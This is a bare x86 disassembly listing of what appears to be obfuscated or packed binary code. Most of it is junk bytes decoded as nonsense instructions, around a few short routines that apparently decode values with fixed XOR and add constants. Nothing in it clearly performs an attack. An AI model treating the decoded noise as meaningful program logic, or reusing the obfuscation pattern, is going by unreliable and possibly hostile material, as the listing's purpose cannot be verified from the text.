  40bdb7:	xchg   esp,eax
  40bdb8:	and    eax,0x4666b7ff
  40bdbd:	shl    BYTE PTR ds:0x31f5f6a9,0x9b
  40bdc4:	jb     0x40bd61
  40bdc6:	xor    ch,ah
  40bdc8:	je     0x40be47
  40bdca:	dec    ecx
  40bdcb:	js     0x40bd99
  40bdcd:	push   esp
  40bdce:	cmp    BYTE PTR [ebx+0x2d],dh
  40bdd1:	popf   
  40bdd2:	pop    ss
  40bdd3:	add    BYTE PTR [edx+0x2b],dl
  40bdd6:	xor    eax,0x8efb9f2f
  40bddb:	dec    ebp
  40bddc:	jo     0x40bde5
  40bdde:	dec    ebp
  40bddf:	and    edx,eax
  40bde1:	mov    al,ds:0x2dd2d4ae
  40bde6:	call   0x7431776c
  40bdeb:	push   edx
  40bdec:	scas   eax,DWORD PTR es:[edi]
  40bded:	jmp    0x8871:0x299efb5e
  40bdf4:	cs dec edx
  40bdf6:	and    DWORD PTR [esi+0x35],edi
  40bdf9:	or     DWORD PTR [esi+edi*8],ebx
  40bdfc:	mov    al,BYTE PTR [edx+0x69]
  40bdff:	retf   0xf00a
  40be02:	into   
  40be03:	jmp    0x40bdd2
  40be05:	or     eax,0xf89a7002
  40be0a:	data16 add al,BYTE PTR [esp+edi*2]
  40be0e:	lods   eax,DWORD PTR ds:[esi]
  40be0f:	xchg   BYTE PTR [esp+edi*1],dl
  40be12:	fisttp WORD PTR [ebx-0x4f]
  40be15:	xor    eax,0x136e0314
  40be1a:	sbb    ebp,DWORD PTR [esi]
  40be1c:	iret   
  40be1d:	(bad)  
  40be1e:	ficom  DWORD PTR [ebp-0x3d]
  40be21:	and    dh,BYTE PTR [ecx-0x19]
  40be24:	push   ss
  40be25:	mov    bh,0xa6
  40be27:	jnp    0x40be2c
  40be29:	data16 jp 0x40be79
  40be2c:	cmp    esp,DWORD PTR [ebx+0x2a]
  40be2f:	mov    dl,0xf6
  40be31:	xor    eax,0x912b885e
  40be36:	mov    al,ds:0x82e5df0d
  40be3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40be3c:	xor    eax,ebp
  40be3e:	sub    ch,ah
  40be40:	arpl   WORD PTR [ebp+0x6a],dx
  40be43:	stos   BYTE PTR es:[edi],al
  40be44:	ins    DWORD PTR es:[edi],dx
  40be45:	pop    ebx
  40be46:	inc    eax
  40be47:	in     al,dx
  40be48:	jp     0x40be51
  40be4a:	add    edi,DWORD PTR [edx-0x79]
  40be4d:	mov    esp,0xfc2a09dd
  40be52:	pop    ecx
  40be53:	hlt    
  40be54:	shl    BYTE PTR [esp+eiz*2+0x53],1
  40be58:	pusha  
  40be59:	dec    ebp
  40be5a:	push   ds
  40be5b:	jne    0x40be84
  40be5d:	pop    esi
  40be5e:	mov    DWORD PTR [ebx+0x67],edx
  40be61:	push   0x1a
  40be63:	sbb    al,0x90
  40be65:	mov    ch,0x67
  40be67:	fnsave [edx]
  40be69:	mov    dh,BYTE PTR [edx+0x38]
  40be6c:	es mov edi,0xa851021
  40be72:	inc    ebx
  40be73:	(bad)  
  40be74:	jp     0x40bee9
  40be76:	retf   
  40be77:	pop    eax
  40be78:	aaa    
  40be79:	mov    ebp,0x9ad6861c
  40be7e:	enter  0x3db4,0x55
  40be82:	push   ds
  40be83:	xchg   esi,eax
  40be84:	xchg   edx,eax
  40be85:	inc    edi
  40be86:	stos   DWORD PTR es:[edi],eax
  40be87:	int    0x5a
  40be89:	mov    esp,0x2ea34889
  40be8e:	sub    al,0x4a
  40be90:	out    dx,al
  40be91:	lahf   
  40be92:	loope  0x40bf08
  40be94:	xor    dl,BYTE PTR [ecx-0x7814ad8c]
  40be9a:	mov    ecx,DWORD PTR [edx+0x6c272bf1]
  40bea0:	in     eax,dx
  40bea1:	fimul  DWORD PTR [eax]
  40bea3:	mov    eax,0x6095c30e
  40bea8:	call   0xebb3:0x364842ef
  40beaf:	sub    ebp,DWORD PTR [edx]
  40beb1:	gs inc ebp
  40beb3:	or     al,BYTE PTR [edx+0x7ad83a64]
  40beb9:	call   0x84deed72
  40bebe:	jge    0x40bee5
  40bec0:	mov    eax,ds:0x1f2df922
  40bec5:	sbb    BYTE PTR [ecx+eax*1+0xf3683ad],ch
  40becc:	pop    ds
  40becd:	cs je  0x40bf3b
  40bed0:	mov    edx,0xe96cb5cf
  40bed5:	xchg   esi,eax
  40bed6:	pop    eax
  40bed7:	dec    ebp
  40bed8:	push   0x58
  40beda:	pop    ss
  40bedb:	push   esp
  40bedc:	out    0x4b,al
  40bede:	in     al,dx
  40bedf:	(bad)  
  40bee1:	test   al,0x3
  40bee3:	push   cs
  40bee4:	jbe    0x40bedc
  40bee6:	ins    BYTE PTR es:[edi],dx
  40bee7:	xor    eax,0x7510854
  40beec:	jmp    0x40b9f2
  40bef1:	mov    eax,DWORD PTR [ebp+0xc]
  40bef4:	add    eax,DWORD PTR [ebp+0x8]
  40bef7:	mov    DWORD PTR [ebp-0x10],eax
  40befa:	mov    eax,DWORD PTR [ebp-0x1c]
  40befd:	test   eax,eax
  40beff:	je     0x40cbbe
  40bf05:	mov    DWORD PTR [ebp-0x24],esi
  40bf08:	push   0xb
  40bf0a:	pop    ecx
  40bf0b:	push   0x5
  40bf0d:	dec    ecx
  40bf0e:	pop    ebx
  40bf0f:	xchg   ebx,ecx
  40bf11:	sub    ebx,ecx
  40bf13:	jmp    0x40c176
  40bf18:	pop    ecx
  40bf19:	jbe    0x69f82f56
  40bf1f:	push   ecx
  40bf20:	scas   eax,DWORD PTR es:[edi]
  40bf21:	or     cl,BYTE PTR [esi-0x45223cf]
  40bf27:	rol    DWORD PTR [eax+0x387e7ef9],cl
  40bf2d:	jl     0x40bfad
  40bf2f:	jle    0x40bf0d
  40bf31:	inc    esp
  40bf32:	jecxz  0x40bf04
  40bf34:	adc    eax,0xcb2c401c
  40bf39:	jbe    0x40bfb8
  40bf3b:	in     eax,dx
  40bf3c:	mov    bh,0x61
  40bf3e:	mov    eax,0x534c0b2e
  40bf43:	pop    ds
  40bf44:	ret    0x6286
  40bf47:	adc    eax,DWORD PTR [edi+0xd]
  40bf4a:	int    0xbe
  40bf4c:	mov    edi,ds
  40bf4e:	bound  ebp,QWORD PTR [edx]
  40bf50:	push   0xffffffa9
  40bf52:	ret    0xad48
  40bf55:	xor    edi,DWORD PTR [ecx]
  40bf57:	icebp  
  40bf58:	xor    BYTE PTR ds:0xe0e9949d,cl
  40bf5e:	jno    0x40bf77
  40bf60:	xor    DWORD PTR [edi+eiz*1+0x6f],0x4dcdbbfe
  40bf68:	inc    esi
  40bf69:	xor    esi,ebx
  40bf6b:	pop    eax
  40bf6c:	lods   eax,DWORD PTR ds:[esi]
  40bf6d:	shl    DWORD PTR [esi+0x35],cl
  40bf70:	outs   dx,BYTE PTR es:[esi]
  40bf72:	lods   al,BYTE PTR ds:[esi]
  40bf73:	lock sub eax,0x7e8924ab
  40bf79:	sbb    BYTE PTR [edx],bh
  40bf7b:	pop    eax
  40bf7c:	je     0x40bfc2
  40bf7e:	sar    BYTE PTR [esi+0x74],cl
  40bf81:	jp     0x40bf58
  40bf83:	and    ebp,DWORD PTR [esp+ebp*1+0x43088629]
  40bf8a:	push   0xeefa92b2
  40bf8f:	imul   ecx,esi,0x4b
  40bf92:	repnz iret 
  40bf94:	xor    bh,bl
  40bf96:	loope  0x40bf39
  40bf98:	dec    ecx
  40bf99:	imul   ecx,DWORD PTR [edx-0x1f836762],0x66947e72
  40bfa3:	pcmpgtb mm5,QWORD PTR [edx+0x2a]
  40bfa7:	pushf  
  40bfa8:	fucom  st(2)
  40bfaa:	nop
  40bfab:	and    ch,BYTE PTR [ebp-0x6a]
  40bfae:	cmc    
  40bfaf:	ja     0x40c006
  40bfb1:	xor    eax,0xb79a65e1
  40bfb6:	ins    DWORD PTR es:[edi],dx
  40bfb7:	jmp    0x40c01a
  40bfb9:	sbb    BYTE PTR ds:0x32837c34,dl
  40bfbf:	cdq    
  40bfc0:	jle    0x40bf88
  40bfc2:	loope  0x40bfc6
  40bfc4:	jp     0x40bfe6
  40bfc6:	sbb    ebx,DWORD PTR [esp+edx*8]
  40bfc9:	adc    BYTE PTR [ecx+eax*8-0x42f0bc5a],cl
  40bfd0:	mov    ch,0x8f
  40bfd2:	mov    DWORD PTR ds:0xa1200269,eax
  40bfd8:	inc    edx
  40bfd9:	jns    0x40c03d
  40bfdb:	mov    ah,0x13
  40bfdd:	cwde   
  40bfde:	or     DWORD PTR [ebp-0x46],edi
  40bfe1:	adc    eax,0x525dbd93
  40bfe6:	call   0x4111be19
  40bfeb:	call   0x54ef:0xcc654585
  40bff2:	shr    BYTE PTR [eax],1
  40bff4:	test   eax,0x8f13b4f2
  40bff9:	(bad)  
  40bffa:	jne    0x40c071
  40bffc:	(bad)  
  40bffd:	aam    0x49
  40bfff:	repz (bad) 
  40c001:	nop
  40c002:	rep lods al,BYTE PTR ds:[esi]
  40c004:	pop    ebp
  40c005:	outs   dx,BYTE PTR ds:[esi]
  40c006:	leave  
  40c007:	push   esp
  40c008:	mov    bh,0x4e
  40c00a:	mov    edi,0x85e9ce68
  40c00f:	and    dl,ch
  40c011:	sbb    eax,0x4dc5b2a9
  40c016:	scas   eax,DWORD PTR es:[edi]
  40c017:	data16 out dx,al
  40c019:	xchg   edx,eax
  40c01a:	push   0xffffff9f
  40c01c:	add    ch,al
  40c01e:	imul   ecx,DWORD PTR [ecx+ebp*1],0x75
  40c022:	sub    dl,BYTE PTR [edi-0x19]
  40c025:	clc    
  40c026:	dec    esp
  40c027:	or     bh,BYTE PTR [edx+0x6fedd75]
  40c02d:	push   ebp
  40c02e:	ret    0x277a
  40c031:	sti    
  40c032:	mov    ebx,0xaa6efd79
  40c037:	jnp    0x40c003
  40c039:	mul    BYTE PTR [edx-0x29eede17]
  40c03f:	pop    ebp
  40c040:	push   eax
  40c041:	inc    DWORD PTR [esi]
  40c043:	mov    ds:0xc060128c,eax
  40c048:	dec    edx
  40c049:	adc    cl,BYTE PTR [ecx]
  40c04b:	sbb    DWORD PTR [eax],ebx
  40c04d:	mov    bl,ch
  40c04f:	sti    
  40c050:	not    edx
  40c052:	xor    al,0x1a
  40c054:	imul   ebp,DWORD PTR [eax+0x29329c46],0xfffffff7
  40c05b:	xchg   DWORD PTR [ebp+0x355e71fb],ebp
  40c061:	pop    ebx
  40c062:	pop    ss
  40c063:	push   edi
  40c064:	sahf   
  40c065:	sbb    al,0x3f
  40c067:	sti    
  40c068:	sar    edi,cl
  40c06a:	je     0x40c040
  40c06c:	(bad)  
  40c06d:	jl     0x40c089
  40c06f:	mov    ecx,0x4c53b4c6
  40c074:	jno    0x40c0af
  40c076:	std    
  40c077:	mov    ebx,0xb34c59c4
  40c07c:	hlt    
  40c07d:	retf   0xcf7f
  40c080:	fwait
  40c081:	enter  0x2d85,0x14
  40c085:	cmp    eax,0xc902d140
  40c08a:	push   ss
  40c08b:	aas    
  40c08c:	or     BYTE PTR [ebx-0x1a900043],bh
  40c092:	cmp    BYTE PTR [edx-0x35d36e9a],dh
  40c098:	adc    esp,DWORD PTR [esi+0x23]
  40c09b:	std    
  40c09c:	push   cs
  40c09d:	mov    bl,0xc9
  40c09f:	jnp    0x40c04a
  40c0a1:	inc    esi
  40c0a2:	and    ebp,DWORD PTR [eax]
  40c0a4:	sub    eax,0x42cf30ad
  40c0a9:	mov    ds:0x7c33c8b1,eax
  40c0ae:	or     al,BYTE PTR [ecx+0x45]
  40c0b1:	mov    BYTE PTR [ebx-0x7304506],ah
  40c0b7:	xchg   esp,eax
  40c0b8:	push   0x4b05ce9
  40c0bd:	adc    cl,BYTE PTR [ebx+0x2e]
  40c0c0:	adc    al,0x35
  40c0c2:	rcr    DWORD PTR [ebx+0x59],cl
  40c0c5:	lea    eax,[ebx+0x3e2e9947]
  40c0cb:	cld    
  40c0cc:	inc    esp
  40c0cd:	lock (bad) 
  40c0cf:	das    
  40c0d0:	mov    eax,0xffb0b23b
  40c0d5:	pop    es
  40c0d6:	out    dx,al
  40c0d7:	ins    DWORD PTR es:[edi],dx
  40c0d8:	push   eax
  40c0d9:	mov    ecx,0xdc3fc189
  40c0de:	mov    eax,ds:0xffdae689
  40c0e3:	jne    0x40c08e
  40c0e5:	adc    BYTE PTR [eax-0x25],dh
  40c0e8:	stos   BYTE PTR es:[edi],al
  40c0e9:	enter  0x5c2,0xcf
  40c0ed:	add    ecx,DWORD PTR [edx]
  40c0ef:	mov    bh,0x8d
  40c0f1:	sub    BYTE PTR [ebx+0x3b],dh
  40c0f4:	pusha  
  40c0f5:	aam    0x78
  40c0f7:	mov    bh,0x68
  40c0f9:	sub    eax,0xb7f9d119
  40c0fe:	mov    ebp,0xf3cda430
  40c103:	adc    al,0x13
  40c105:	pop    di
  40c107:	mov    DWORD PTR [esp+ecx*4-0x5a3bcfac],ebx
  40c10e:	jmp    0x93a832ac
  40c113:	pop    ebp
  40c114:	push   0xffffffc7
  40c116:	or     BYTE PTR [ecx+0xb],ah
  40c119:	shl    DWORD PTR [ebp+ebp*8-0x13bddb2],0x6f
  40c121:	push   ebp
  40c122:	dec    eax
  40c123:	dec    esi
  40c124:	inc    esi
  40c125:	aas    
  40c126:	cli    
  40c127:	jo     0x40c11f
  40c129:	aaa    
  40c12a:	jbe    0x40c1a6
  40c12c:	sbb    BYTE PTR [edi+0x38],dh
  40c12f:	cmp    esp,DWORD PTR [ebp+0x78]
  40c132:	xchg   esp,eax
  40c133:	loope  0x40c0fe
  40c135:	adc    BYTE PTR [ecx],0x9b
  40c138:	cmp    eax,0x858af294
  40c13d:	xor    al,0x64
  40c13f:	push   edx
  40c140:	rcl    BYTE PTR [eax-0x67f060f],0xc2
  40c147:	ror    BYTE PTR ds:0x19b7a7ab,1
  40c14d:	sahf   
  40c14e:	sub    edi,0x9bc4f50b
  40c154:	stos   BYTE PTR es:[edi],al
  40c155:	pop    eax
  40c156:	call   0x3e77695b
  40c15b:	jb     0x40c13a
  40c15d:	xchg   ecx,eax
  40c15e:	aam    0x45
  40c160:	loopne 0x40c1d4
  40c162:	enter  0x505f,0x26
  40c166:	retf   0x1a18
  40c169:	cli    
  40c16a:	inc    esi
  40c16b:	loope  0x40c1bd
  40c16d:	lods   al,BYTE PTR ds:[esi]
  40c16e:	and    al,0xc4
  40c170:	mov    edi,0x73b2df3a
  40c175:	cmc    
  40c176:	xchg   ebx,ecx
  40c178:	dec    ecx
  40c179:	mov    eax,DWORD PTR [ebp-0x1c]
  40c17c:	imul   eax,ecx
  40c17f:	sub    esp,eax
  40c181:	mov    DWORD PTR [ebp-0x24],esp
  40c184:	jmp    0x40c3e7
  40c189:	dec    ebx
  40c18a:	loop   0x40c1d9
  40c18c:	lds    esi,FWORD PTR [ebp+0x71]
  40c18f:	push   ebx
  40c190:	jo     0x40c117
  40c192:	mov    cl,0xee
  40c194:	sub    al,0xb5
  40c196:	mov    edx,0x874a9823
  40c19b:	jle    0x40c21b
  40c19d:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40c1a1:	mov    eax,ds:0xd2c4e2c8
  40c1a6:	mov    DWORD PTR [eax+ebp*4-0x67],0x92e0d422
  40c1ae:	fisub  WORD PTR [edi-0x22bb54c9]
  40c1b4:	nop
  40c1b5:	ds mov esp,0x3476ecfe
  40c1bb:	(bad)  
  40c1bc:	fbld   TBYTE PTR [ecx-0x718dedcb]
  40c1c2:	bound  esi,QWORD PTR ds:0xca165865
  40c1c8:	bound  eax,QWORD PTR [edx-0x3c925a22]
  40c1ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c1cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c1d0:	popf   
  40c1d1:	imul   esi,DWORD PTR [edx],0x78b695b4
  40c1d7:	jmp    0x40c226
  40c1d9:	ficomp WORD PTR ss:[eax+0x54]
  40c1dd:	dec    ebx
  40c1de:	xchg   esi,eax
  40c1df:	clc    
  40c1e0:	dec    edi
  40c1e1:	adc    ebp,DWORD PTR [edx+0x7798d230]
  40c1e7:	inc    edx
  40c1e8:	(bad)
  40c1eb:	loopne 0x40c232
  40c1ed:	mov    esp,0xbc821e65
  40c1f2:	repz out dx,eax
  40c1f4:	rcr    BYTE PTR [eax],cl
  40c1f6:	nop
  40c1f7:	(bad)  
  40c1f9:	xor    eax,0x313cbdd2
  40c1fe:	and    bl,bh
  40c200:	mov    BYTE PTR [eax],0xe1
  40c203:	xchg   edi,eax
  40c204:	or     ebx,DWORD PTR [eax]
  40c206:	mov    bh,0x38
  40c208:	push   0x3b167722
  40c20d:	fcomp  QWORD PTR [ebx+0x2ae35b77]
  40c213:	in     eax,dx
  40c214:	loop   0x40c1e8
  40c216:	leave  
  40c217:	dec    eax
  40c218:	ret    0x63f0
  40c21b:	dec    esp
  40c21c:	shr    DWORD PTR [esi-0x48],0xe7
  40c220:	jbe    0x40c1be
  40c222:	xor    al,BYTE PTR [ebp+0x1402ce51]
  40c228:	jp     0x40c1fc
  40c22a:	fld    DWORD PTR [ebx+eiz*1+0x3]
  40c22e:	cld    
  40c22f:	and    DWORD PTR [esi],edx
  40c231:	or     al,0xc
  40c233:	pop    esp
  40c234:	push   ebp
  40c235:	out    0xa3,al
  40c237:	hlt    
  40c238:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c239:	xchg   DWORD PTR [edx],edx
  40c23b:	xchg   ebp,eax
  40c23c:	cmp    cl,BYTE PTR [edi+esi*1+0x7a4e4a58]
  40c243:	ja     0x40c1d7
  40c245:	cmp    BYTE PTR [edi+edx*2+0x6a],al
  40c249:	push   0x1f0d5c2b
  40c24e:	xor    ebp,DWORD PTR [eax-0x63fef797]
  40c254:	mov    dl,0xf0
  40c256:	mov    ds:0x5fb8a5ed,al
  40c25b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c25c:	rcl    BYTE PTR [eax+eiz*2+0x45609d46],0x6
  40c264:	xor    eax,0x7042dbee
  40c269:	mov    DWORD PTR [edx],ebx
  40c26b:	or     DWORD PTR [esi-0x7],0x81f5f096
  40c272:	leave  
  40c273:	stos   DWORD PTR es:[edi],eax
  40c274:	dec    edx
  40c275:	loopne 0x40c290
  40c277:	scas   eax,DWORD PTR es:[edi]
  40c278:	xchg   edx,eax
  40c279:	lahf   
  40c27a:	clc    
  40c27b:	bound  edx,QWORD PTR [ebx+eiz*2]
  40c27e:	jge    0x40c209
  40c280:	push   ecx
  40c281:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c282:	jb     0x40c2a2
  40c284:	int    0x71
  40c286:	cwde   
  40c287:	test   ecx,ebx
  40c289:	test   al,0xeb
  40c28b:	adc    DWORD PTR ds:0x163048e4,ebx
  40c291:	aas    
  40c292:	popf   
  40c293:	dec    eax
  40c294:	cmp    al,0x9e
  40c296:	and    al,0x54
  40c298:	imul   esi,DWORD PTR ds:0xf5f35651,0x2ce79698
  40c2a2:	in     al,0x8
  40c2a4:	cmp    dh,BYTE PTR [ecx+0x24]
  40c2a7:	aas    
  40c2a8:	shl    DWORD PTR [esi],cl
  40c2aa:	shl    DWORD PTR [ecx+0x438525fa],1
  40c2b0:	rcr    DWORD PTR [edi+0x5e],0xc7
  40c2b4:	(bad)  
  40c2b5:	int3   
  40c2b6:	or     eax,0x3a1c7306
  40c2bb:	mov    ch,0xe8
  40c2bd:	mov    cl,0x58
  40c2bf:	daa    
  40c2c0:	loop   0x40c2f1
  40c2c2:	dec    esi
  40c2c3:	sub    al,0x28
  40c2c5:	adc    DWORD PTR [esp+eiz*8],ebp
  40c2c8:	jbe    0x40c349
  40c2ca:	loope  0x40c2de
  40c2cc:	xor    ch,dl
  40c2ce:	mov    ah,0xc1
  40c2d0:	cmp    ebx,DWORD PTR ds:0xb181e615
  40c2d6:	or     ebp,DWORD PTR [eax+0x33]
  40c2d9:	fcomip st,st(3)
  40c2db:	shr    BYTE PTR [ecx+eax*2-0x3c],0xe5
  40c2e0:	hlt    
  40c2e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c2e2:	jbe    0x40c323
  40c2e4:	lock mov ebp,DWORD PTR [edx]
  40c2e7:	shl    BYTE PTR [eax+0x69a6c275],0x90
  40c2ee:	into   
  40c2ef:	mov    ds:0x70f9f15a,al
  40c2f4:	pusha  
  40c2f5:	out    dx,al
  40c2f6:	aam    0x3e
  40c2f8:	pop    edx
  40c2f9:	cmp    eax,0xdf2b3501
  40c2fe:	fild   QWORD PTR [ecx]
  40c300:	push   es
  40c301:	inc    edi
  40c302:	and    esp,DWORD PTR [edx+0x2e]
  40c305:	adc    al,0x91
  40c307:	adc    dh,BYTE PTR [eax]
  40c309:	mov    cl,0x8e
  40c30b:	pusha  
  40c30c:	aaa    
  40c30d:	mov    ebx,0x5ea29c53
  40c312:	push   esi
  40c313:	mov    edi,0x27d67cdf
  40c318:	dec    esp
  40c319:	ret    
  40c31a:	jle    0x40c355
  40c31c:	sbb    DWORD PTR ds:0x7d4ecc34,esp
  40c322:	or     DWORD PTR [edi+0x30],ebp
  40c325:	adc    cl,dl
  40c327:	in     eax,0xa7
  40c329:	mov    cl,0x8a
  40c32b:	aad    0x5c
  40c32d:	aad    0x85
  40c32f:	xor    esi,DWORD PTR [edx+ebx*1]
  40c332:	aas    
  40c333:	adc    BYTE PTR [edi+0x2f5b1788],bh
  40c339:	mov    cl,BYTE PTR [eax+ebx*2-0x5e]
  40c33d:	imul   edi,edx,0x19efb589
  40c343:	or     eax,0x482ba342
  40c348:	sbb    eax,DWORD PTR ds:0x9714588c
  40c34e:	inc    edx
  40c34f:	popa   
  40c350:	call   0xa97e:0x536866c7
  40c357:	shr    ch,1
  40c359:	scas   al,BYTE PTR es:[edi]
  40c35a:	in     eax,0x5d
  40c35c:	fiadd  WORD PTR [ebx-0x16af1be3]
  40c362:	lock xchg ebx,eax
  40c364:	inc    esi
  40c365:	sub    bl,BYTE PTR [eax+0x3f9caa97]
  40c36b:	dec    ecx
  40c36c:	jmp    0x2e50ab08
  40c371:	push   ss
  40c372:	xchg   BYTE PTR [eax+eax*2-0x6cf0c1f8],ah
  40c379:	mov    cl,0xf5
  40c37b:	in     al,dx
  40c37c:	in     al,dx
  40c37d:	pop    ecx
  40c37e:	sbb    DWORD PTR [ecx+0x61ef931c],esp
  40c384:	setbe  bl
  40c387:	pop    es
  40c388:	mov    dh,0xb
  40c38a:	aas    
  40c38b:	(bad)  
  40c38d:	push   ecx
  40c38e:	outs   dx,BYTE PTR ds:[esi]
  40c38f:	enter  0xbfb5,0xc3
  40c393:	ret    
  40c394:	ins    BYTE PTR es:[edi],dx
  40c395:	bound  edx,QWORD PTR [esp+ebp*4-0x1eb14cac]
  40c39c:	and    eax,0x4b5ed40d
  40c3a1:	dec    ebp
  40c3a2:	mov    ebp,ecx
  40c3a4:	jb     0x40c371
  40c3a6:	pop    edx
  40c3a7:	adc    eax,0x6a9156ce
  40c3ac:	xchg   DWORD PTR [ebx-0x6b87ed83],ecx
  40c3b2:	aad    0x37
  40c3b4:	scas   al,BYTE PTR es:[edi]
  40c3b5:	dec    ebx
  40c3b6:	scas   eax,DWORD PTR es:[edi]
  40c3b7:	bound  ecx,QWORD PTR [edi-0x32]
  40c3ba:	rcl    BYTE PTR [ebp+ecx*4-0x10c6f6b5],0x2a
  40c3c2:	mov    ecx,0xc8f648e8
  40c3c7:	jmp    0x3c41:0x63141be
  40c3ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c3cf:	(bad)  [edi+0x26]
  40c3d2:	adc    BYTE PTR [ecx+0x5e],0xd5
  40c3d6:	dec    ebp
  40c3d7:	retf   0xd222
  40c3da:	and    al,0x6f
  40c3dc:	add    al,0x41
  40c3de:	dec    ebx
  40c3df:	retf   
  40c3e0:	in     eax,0xb0
  40c3e2:	cwde   
  40c3e3:	xor    dh,al
  40c3e5:	inc    ebx
  40c3e6:	(bad)  
  40c3e7:	mov    eax,DWORD PTR [ebp-0x4]
  40c3ea:	mov    ecx,0x7510854
  40c3ef:	xor    eax,ecx
  40c3f1:	mov    edx,0x32729b
  40c3f6:	add    eax,edx
  40c3f8:	mov    DWORD PTR [ebp+0x8],eax
  40c3fb:	mov    eax,DWORD PTR [ebp-0x18]
  40c3fe:	xor    eax,ecx
  40c400:	add    eax,edx
  40c402:	mov    edx,DWORD PTR [ebp+0x14]
  40c405:	imul   eax,DWORD PTR [edx]
  40c408:	mov    edx,DWORD PTR [ebp-0x4]
  40c40b:	xor    edx,ecx
  40c40d:	mov    ecx,DWORD PTR [ebp+0x8]
  40c410:	lea    ecx,[edx+ecx*1+0x32729b]
  40c417:	cmp    ecx,eax
  40c419:	je     0x40cbb9
  40c41f:	mov    edi,DWORD PTR [ebp-0x18]
  40c422:	mov    eax,DWORD PTR [ebp+0x8]
  40c425:	mov    edx,DWORD PTR [ebp+0x14]
  40c428:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40c42c:	mov    ecx,0x7510854
  40c431:	xor    edx,edx
  40c433:	xor    edi,ecx
  40c435:	jmp    0x40c698
  40c43a:	dec    ebp
  40c43b:	scas   al,BYTE PTR es:[edi]
  40c43c:	push   ss
  40c43d:	pop    ebx
  40c43e:	cmc    
  40c43f:	arpl   WORD PTR [ecx-0x58],si
  40c442:	pop    esi
  40c443:	clc    
  40c444:	push   ss
  40c445:	shl    DWORD PTR [edx+0x2e],cl
  40c448:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c449:	mov    esp,0x7e7e8214
  40c44e:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40c452:	pop    edx
  40c453:	rcl    ecx,0xdb
  40c456:	scas   eax,DWORD PTR es:[edi]
  40c457:	mov    dh,0xce
  40c459:	sbb    eax,esi
  40c45b:	aaa    
  40c45c:	xor    BYTE PTR ds:0x4213c06b,bh
  40c462:	mov    ebx,DWORD PTR [edx+0x5f]
  40c465:	or     ah,BYTE PTR [ecx+0x39]
  40c468:	mov    edi,0xe2636eeb
  40c46d:	inc    eax
  40c46e:	in     al,dx
  40c46f:	lods   al,BYTE PTR ds:[esi]
  40c470:	and    esi,DWORD PTR [ecx-0x2b]
  40c473:	lds    edi,FWORD PTR [edx]
  40c475:	repz ret 0xb3f0
  40c479:	push   ecx
  40c47a:	aad    0x74
  40c47c:	ins    DWORD PTR es:[edi],dx
  40c47d:	cmp    al,0xd2
  40c47f:	fcom   DWORD PTR [eax-0x239e1f9f]
  40c485:	sub    esp,DWORD PTR [edi+0x2b]
  40c488:	xchg   edx,eax
  40c489:	rcr    DWORD PTR [ecx+0x76],cl
  40c48c:	leave  
  40c48d:	mov    dl,0x2f
  40c48f:	mov    dl,0x9e
  40c491:	clc    
  40c492:	xor    ebp,ebp
  40c494:	jne    0x40c43d
  40c496:	not    BYTE PTR [edx]
  40c498:	shl    DWORD PTR [ebx+0x7b],0x34
  40c49c:	jno    0x40c518
  40c49e:	pop    edx
  40c49f:	int3   
  40c4a0:	lahf   
  40c4a1:	mov    esi,0xd9220ce5
  40c4a6:	push   esi
  40c4a7:	out    dx,eax
  40c4a8:	push   eax
  40c4a9:	xchg   BYTE PTR [ecx],al
  40c4ab:	cmc    
  40c4ac:	es aas 
  40c4ae:	repz in al,dx
  40c4b0:	cld    
  40c4b1:	mov    al,0x14
  40c4b3:	pusha  
  40c4b4:	pusha  
  40c4b5:	jmp    0x40c4d6
  40c4b7:	xchg   esi,eax
  40c4b8:	fs adc ah,dl
  40c4bb:	cmc    
  40c4bc:	push   0x290befe8
  40c4c1:	sbb    eax,0x4785c1dd
  40c4c6:	ds imul esp,ebp,0x58
  40c4ca:	xchg   esp,eax
  40c4cb:	mov    bh,0xd8
  40c4cd:	or     DWORD PTR ss:[edx-0x13e04622],edx
  40c4d4:	push   0xffffffb9
  40c4d6:	push   esi
  40c4d7:	push   es
  40c4d8:	jecxz  0x40c4c3
  40c4da:	fnstenv [edi+edx*4]
  40c4dd:	or     BYTE PTR [edi],0x33
  40c4e0:	jnp    0x40c51a
  40c4e2:	jno    0x40c4d9
  40c4e4:	sub    BYTE PTR [esp+esi*4+0x70],bl
  40c4e8:	fs cli 
  40c4ea:	imul   esp,DWORD PTR [edx],0x7bfa6c4e
  40c4f0:	sbb    ah,BYTE PTR [ebx+0x8]
  40c4f3:	loope  0x40c515
  40c4f5:	pop    eax
  40c4f6:	call   0xfa972d68
  40c4fb:	imul   ecx,DWORD PTR es:[edi-0x12346c92],0x27
  40c503:	aam    0xd3
  40c505:	lock pop edx
  40c507:	or     dl,dl
  40c509:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c50a:	inc    ecx
  40c50b:	mov    ah,0x89
  40c50d:	and    eax,0xc9873a58
  40c512:	icebp  
  40c513:	jle    0x40c50e
  40c515:	adc    eax,0xb177f5ed
  40c51a:	adc    BYTE PTR [esi],0x67
  40c51d:	dec    esi
  40c51e:	mov    ds:0x18203c19,al
  40c523:	shl    BYTE PTR [esi+eax*4],cl
  40c526:	mov    cl,0x19
  40c528:	ror    BYTE PTR [ebx],cl
  40c52a:	mov    ecx,?
  40c52c:	in     al,0xab
  40c52e:	and    BYTE PTR [ecx],bh
  40c530:	inc    esp
  40c531:	xor    al,0x35
  40c533:	inc    esi
  40c534:	mov    ds:0x4dabb7a7,eax
  40c539:	ret    0x2bc1
  40c53c:	inc    eax
  40c53d:	or     DWORD PTR [ecx+0xb],edx
  40c540:	aaa    
  40c541:	mov    eax,ds:0xefd8dc44
  40c546:	js     0x40c518
  40c548:	dec    ebp
  40c549:	shl    BYTE PTR gs:[ecx],0x6f
  40c54d:	(bad)  
  40c54e:	sub    DWORD PTR [eax-0x77],edi
  40c551:	clc    
  40c552:	hlt    
  40c553:	pmuludq mm5,mm2
